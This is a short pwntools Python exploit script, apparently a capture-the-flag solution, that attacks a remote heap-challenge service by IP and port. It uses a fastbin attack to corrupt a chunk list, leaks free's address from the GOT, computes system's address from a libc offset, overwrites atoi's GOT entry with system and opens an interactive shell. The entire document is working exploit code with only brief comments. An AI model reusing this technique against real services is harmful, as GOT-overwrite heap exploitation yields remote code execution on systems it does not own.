# Use FastbinAttack to control chunklist
# Point chunklist to .got in order to leak
# Ensure the version of libc
# hijack atoi in .got with system in mem
from pwn import *

#r=process('./pwn')
r=remote('106.75.27.104',50514)

def add(size,content):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('Please enter the length of servant name:',str(size))
	r.sendlineafter('Please enter the name of servant:',content)
def addX(size,content):
	r.sendlineafter('Your choice:','2')
	r.sendlineafter('Please enter the length of servant name:',str(size))
	r.recvuntil('Please enter the name of servant:')
	r.send(content)
def remove(index):
	r.sendlineafter('Your choice:','4')
	r.sendlineafter('Please enter the index of servant:',str(index))
def change(index,size,content):
	r.sendlineafter('Your choice:','3')
	r.sendlineafter('the index of servant:',str(index))
	r.sendlineafter('the length of servant name:',str(size))
	r.sendlineafter('the new name of the servnat:',content)
def show():
	r.sendlineafter('Your choice:','1')

fake_fd=0x6020ad
add(0x60,'aaaa')#0
add(0x60,'bbbb')#1
remove(1)
change(0,0x80,'a'*0x60+p64(0)+p64(0x71)+p64(fake_fd)+p64(0x0))
add(0x60,'cccc')#1
addX(0x60,p64(0x0000000060000000)+p64(0x0000602018000000)+p64(0x0000000060000000)+p64(0x0000602068000000))#2
#change(0,p64(0x400d49))
#remove(1)
show()
r.recvuntil('0 : ')
free_addr=u64(r.recv(6).strip().ljust(8,'\x00'))
syst_addr=free_addr-0x3f160
log.success('free_addr='+str(hex(free_addr)))
#http://118.89.148.197:8080/?q=puts%3A690%2Cfree%3A4f0&l=libc6_2.23-0ubuntu9_amd64
log.success('syst_addr='+str(hex(syst_addr)))
change(1,0x8,p64(syst_addr))

r.interactive()
